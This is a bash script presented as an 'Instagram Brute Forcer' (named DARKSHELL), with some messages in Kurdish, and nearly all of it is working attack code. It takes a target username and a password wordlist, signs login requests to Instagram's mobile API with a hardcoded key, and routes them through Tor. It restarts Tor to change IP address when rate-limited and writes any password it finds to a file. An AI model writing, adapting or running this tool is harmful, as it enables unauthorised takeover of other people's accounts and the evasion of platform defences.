#!/bin/bash
# Coded by: #experts #azad 

trap 'store;exit 1' 2
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "(tor) install nabua tkaya installi bka yan awa bnusa -> ./install.sh."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "(curl) install nabua tkaya installi bka yan awa bnusa ->./install.sh."; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 "(openssl) install nabua tkaya installi bka yan awa bnusa ->./install.sh "; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 "(twk) install nabua tkaya installi bka"; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "(sed) install nabua tkaya installi bka"; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "(cat) install nabua tkaya installi bka"; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "(tr) install nabua tkaya installi bka"; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "(wc) install nabua tkaya installi bka"; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "(cut) install nabua tkaya installi bka"; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "(uniq) install nabua tkaya installi bka"; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi

}

banner() {

printf "\e[1;92m      _              _  _       _             _  _           \e[0m\n"
printf "\e[1;82m     | |            | |//      | |           | || |          \e[0m\n"
printf "\e[1;92m     | | _____  _  _| |/   ___ | |__   _____ | || |          \e[0m\n"
printf "\e[1;82m ___/| |(____ || |//| |   /___)|  _ \ | ___ || || |          \e[0m\n"
printf "\e[1;92m| __ | |/ ___ || |/ | |\ |___ || | | || ____|| || |  _____   \e[0m\n"
printf "\e[1;82m|____|_|\_____||_|  |_|\\ (___/ |_| |_||_____) \_)\_)(_____) #experts \e[0m\n"
printf "\n"
printf "\e[1;92m\e[45m  Instagram Brute Forcer v1.0 by #experts  \e[0m\n"
printf "\n"
}


function start() {
banner
#checkroot
dependencies
read -p $'\e[1;92mUsername account: \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "lawanaya aw page rash bu betawa ")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"
fi
}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mTKAYA BZANA (TOR)KARAYA BO KARAKRDNI BNUSA service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $countpass > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./DARKSHELL --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor


}

function bruteforcer() {

checktor
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [[ "$token" -lt "$count_pass" ]]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.DARKSHELL ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.DARKSHELL \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.DARKSHELL ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.DARKSHELL \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
done
exit 1
}



function resume() {

banner 
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads=10
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"


count_pass=$(wc -l $wl_pass | cut -d " " -f1)

while [[ "$token" -lt "$count_pass" ]]; do
IFS=$'\n'
for pass in $(sed -n '/\b'$pass'\b/,'$(($token+threads))'p' $wl_pass); do
#for pass in $(sed -n '/\b'$pass'\b/,'$threads'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
let token++
{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.DARKSHELL ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.DARKSHELL \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.DARKSHELL ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.DARKSHELL \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
let token--
changeip
done
exit 1
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac
